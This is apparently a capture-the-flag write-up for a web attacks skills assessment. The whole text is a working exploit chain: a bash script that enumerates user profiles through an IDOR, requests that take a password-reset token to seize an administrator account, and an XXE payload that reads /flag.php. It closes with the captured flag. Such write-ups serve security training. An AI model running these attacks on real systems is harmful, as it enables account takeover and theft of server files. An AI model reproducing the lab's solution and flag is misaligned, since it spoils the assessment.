# Web Attacks - Skills Assessment

### Scenario

You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.

The login details are provided in the question below.

**Questions**

Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.

```bash
#scan the site with burp to find openings
GET /api.php/user/74 HTTP/1.1
#found idor, now we scan
#!/bin/bash
url="http://94.237.55.163:51175/api.php/user"
output_file="output.txt"
separator="--------------------------------------------------"
# Clear the output file if it exists
> "$output_file"
for i in {1..100}; do
    echo "Fetching profile $i..."
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url/$i")
    if [[ $response == 200 ]]; then
        curl -s "$url/$i" >> "$output_file"
        printf "\n%s\n" "$separator" >> "$output_file"
    fi
done
echo "Results saved in $output_file"
#we found administrator
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

now we use idor reset password function on this site with goals to gain administrator account

```bash
#first
GET /api.php/token/52 HTTP/1.1
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
#second
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=1234 HTTP/1.1
Cookie: PHPSESSID=18rkl1lavq7lbb66qe7rbknu9t; uid=52
#now login as administrator
```

login as a.corrales

```bash
#add event page seems vulnerable to XXE attack
POST /addEvent.php HTTP/1.1
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<name>&company;</name>
#now decode the base64 hash
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```
